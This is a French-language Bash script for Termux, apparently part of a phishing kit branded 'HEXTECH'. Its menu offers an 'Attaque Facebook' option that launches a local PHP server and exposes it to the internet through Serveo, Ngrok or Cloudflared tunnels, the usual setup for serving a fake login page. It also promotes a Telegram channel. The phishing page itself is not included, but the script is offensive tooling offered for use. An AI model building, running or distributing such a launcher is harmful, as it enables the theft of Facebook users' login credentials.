# Couleurs
BLEU='\033[1;34m'
JAUNE='\033[1;33m'
ROUGE='\033[1;31m'
NC='\033[0m' # Pas de couleur

# Fonction pour démarrer le serveur PHP
demarrer_serveur_php() {
    echo -e "${BLEU}[•] Démarrage du serveur PHP...${NC}"
    php -S localhost:3000 > /dev/null 2>&1 & # Lancer le serveur en arrière-plan
    sleep 2 # Attendre que le serveur démarre
}

# Fonction pour télécharger et installer Ngrok
installer_ngrok() {
    echo -e "${JAUNE}[•] Téléchargement de Ngrok...${NC}"

    # Détecter l'architecture de l'appareil (ARM/ARM64/amd64)
    arch=$(uname -m)
    if [ "$arch" == "aarch64" ]; then
        ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-arm64.tgz"
    elif [ "$arch" == "armv7l" ] || [ "$arch" == "arm" ]; then
        ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-arm.tgz"
    else
        ngrok_url="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.tgz"
    fi

    # Télécharger Ngrok
    if wget -O ngrok.tgz "$ngrok_url"; then
        echo -e "${BLEU}[✓] Ngrok téléchargé avec succès.${NC}"
    else
        echo -e "${ROUGE}[!] Échec du téléchargement de Ngrok. Vérifiez votre connexion internet.${NC}"
        exit 1
    fi

    # Extraire et déplacer Ngrok
    if tar -xvzf ngrok.tgz; then
        mv ngrok /usr/local/bin/ || {
            echo -e "${ROUGE}[!] Impossible de déplacer Ngrok vers /usr/local/bin.${NC}"
            exit 1
        }
        rm ngrok.tgz
        echo -e "${BLEU}[✓] Ngrok installé avec succès.${NC}"
    else
        echo -e "${ROUGE}[!] Échec de l'extraction de Ngrok. Vérifiez le fichier téléchargé.${NC}"
        rm ngrok.tgz
        exit 1
    fi
}

# Fonction pour générer un lien avec Ngrok
generer_lien_ngrok() {
    echo -e "${JAUNE}[•] Démarrage de Ngrok...${NC}"
    if ! command -v ngrok &> /dev/null; then
        installer_ngrok
    fi
    ngrok http 3000 || {
        echo -e "${ROUGE}[!] Une erreur s'est produite lors du lancement de Ngrok.${NC}"
        exit 1
    }
}

# Fonction pour générer un lien avec Serveo
generer_lien_serveo() {
    echo -e "${JAUNE}HEXTECH 🦠 [*] Connexion à Serveo pour générer un lien public...${NC}"
    ssh -R 80:localhost:3000 serveo.net -p 22 || {
        echo -e "${ROUGE}[!] Échec de la connexion à Serveo. Vérifiez votre connexion internet.${NC}"
    }
}

# Fonction pour générer un lien avec une méthode alternative (Cloudflared)
generer_lien_autre() {
    echo -e "${JAUNE}[•] Démarrage avec une autre méthode (ex : Cloudflared)...${NC}"
    if ! command -v cloudflared &> /dev/null; then
        echo -e "${ROUGE}[!] Cloudflared n'est pas installé. Installation en cours...${NC}"
        pkg install cloudflared -y
    fi
    cloudflared tunnel --url http://localhost:3000 || {
        echo -e "${ROUGE}[!] Une erreur s'est produite lors du lancement de Cloudflared.${NC}"
        exit 1
    }
}

# Vérification si SSH et PHP sont installés
if ! command -v ssh &> /dev/null; then
    echo -e "${ROUGE}[!] SSH n'est pas installé. Installation en cours...${NC}"
    pkg install openssh -y
fi

if ! command -v php &> /dev/null; then
    echo -e "${ROUGE}[!] PHP n'est pas installé. Installation en cours...${NC}"
    pkg install php -y
fi

# Menu principal
clear
echo -e "${BLEU}"
echo -e "=========================================="
echo -e "      ██╗  ██╗███████╗██╗  ██╗████████╗  "
echo -e "      ██║  ██║██╔════╝██║  ██║╚══██╔══╝  "
echo -e "      ███████║█████╗  ███████║   ██║      "
echo -e "      ██╔══██║██╔══╝  ██╔══██║   ██║      "
echo -e "      ██║  ██║███████╗██║  ██║   ██║      "
echo -e "      ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝      "
echo -e "=========================================="
echo -e "          🦠 ⚕️ ＨＥＸ✦ＴＥＣＨ⚕️  🦠            "
echo -e "=========================================="
echo -e "${NC}"

echo -e "${JAUNE}1. Attaque Facebook${NC}"
echo -e "${JAUNE}2. Rejoindre notre canal Telegram${NC}"

# Lecture du choix utilisateur
read -p "Choisissez une option (1 ou 2) : " choix

if [ "$choix" == "1" ]; then
    echo -e "${JAUNE}Choisissez une méthode pour générer un lien public :${NC}"
    echo -e "${BLEU}1. Serveo${NC}"
    echo -e "${BLEU}2. Ngrok${NC}"
    echo -e "${BLEU}3. Méthode alternative (ex : Cloudflared)${NC}"
    read -p "Votre choix (1, 2 ou 3) : " methode

    # Démarrer le serveur PHP
    demarrer_serveur_php

    case "$methode" in
        1)
            generer_lien_serveo
            ;;
        2)
            generer_lien_ngrok
            ;;
        3)
            generer_lien_autre
            ;;
        *)
            echo -e "${ROUGE}Option invalide. Retour au menu principal...${NC}"
            ;;
    esac
elif [ "$choix" == "2" ]; then
    echo -e "${BLEU}Ouverture de notre canal Telegram...${NC}"
    termux-open-url "https://t.me/+IcftRA7eTCNiOGFk"
else
    echo -e "${ROUGE}Option invalide. Quitter...${NC}"
fi
